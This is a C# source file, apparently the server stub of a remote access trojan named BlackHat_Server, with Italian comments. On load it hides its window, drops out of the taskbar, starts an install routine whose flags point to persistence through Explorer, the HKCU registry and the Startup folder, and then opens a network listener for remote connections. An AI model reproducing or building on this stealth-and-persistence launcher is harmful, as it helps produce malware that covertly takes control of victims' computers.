using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Net;
using System.Management;
using System.IO;
using System.Net.Sockets;

namespace BlackHat_Server
{
    public partial class Host : Form
    {
        
        
        public Host()
        {
            InitializeComponent();


        }

        private void Host_Load(object sender, EventArgs e)
        {
            
          
            // VERSIONE DEL SERVER
            ST_Client.Instance.ServerVersion = "0.0.7";

            this.Hide();
            this.ShowInTaskbar = false;

            StartSrv();        
                   
        }


        private void button1_Click(object sender, EventArgs e)
        {            

            StartSrv(); 
        }


        private void StartSrv()
        {


            // SPOSTATO IN PROGRAM (PRRIMA DI CONTROLLO MUTEX)
            //CreateStClient cc = new CreateStClient();
            //cc.InitializeStClient();           
         


            // INSTALLAZIONE SERVER
            if (ST_Client.Instance.bUseExplorer || ST_Client.Instance.bUseHKCU || ST_Client.Instance.bUseStartupFolder)
            {
                InstallClass ins = new InstallClass();
                ins.StartInstallTHread();
            }
            //-----------------------------------------------


            // START SERVER
            Connection con = new Connection();
            con.StartServer();
           

            
        }

       

        private void Host_FormClosing(object sender, FormClosingEventArgs e)
        {
           
            
        }

          
      

              
     
    }
}
